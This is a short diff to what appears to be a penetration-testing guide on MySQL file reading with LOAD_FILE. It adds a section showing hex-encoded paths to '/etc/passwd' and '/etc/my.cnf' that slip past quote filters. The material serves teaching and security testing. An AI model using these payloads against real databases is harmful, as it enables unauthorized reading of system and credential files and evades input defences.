@@ -30,6 +30,18 @@ SELECT LOAD_FILE('/etc/passwd');
 
 This function returns the file contents as a string or NULL if the file doesn't exist or isn't readable.
 
+#### Hex Encoding to Bypass Filters
+
+Use hex encoding to avoid quote filters:
+
+```sql
+-- '/etc/passwd' in hex
+SELECT LOAD_FILE(0x2F6574632F706173737764);
+
+-- '/etc/my.cnf' in hex
+SELECT LOAD_FILE(0x2F6574632F6D792E636E66);
+```
+
 ### Checking for FILE Privilege
 
 Before attempting to read files, check if the current user has the necessary privilege:
